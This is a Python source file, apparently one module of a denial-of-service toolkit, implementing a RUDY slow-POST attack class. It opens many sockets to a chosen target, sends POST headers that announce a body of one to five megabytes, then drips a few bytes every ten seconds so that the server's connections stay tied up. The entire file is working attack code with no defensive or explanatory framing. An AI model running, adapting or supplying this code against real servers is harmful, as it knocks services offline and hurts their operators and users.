import socket
import random
import time
import threading
from .base import AttackBase

USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"]

class RUDY(AttackBase):
    def __init__(self, *args, sockets_per_thread=50, **kwargs):
        super().__init__(*args, **kwargs)
        self.sockets_per_thread = sockets_per_thread
        self.sockets = []
        self.sock_lock = threading.Lock()

    def _create_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((self.target, self.port))
        content_length = random.randint(1000000, 5000000)
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Content-Length: {content_length}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"\r\n"
        )
        sock.send(headers.encode())
        return sock

    def worker(self):
        with self.sock_lock:
            while len(self.sockets) < self.sockets_per_thread:
                try:
                    sock = self._create_socket()
                    self.sockets.append(sock)
                except:
                    break
        for sock in list(self.sockets):
            try:
                sock.send(b"a" * random.randint(10, 100))
                time.sleep(10)
            except:
                self.sockets.remove(sock)
        return 10
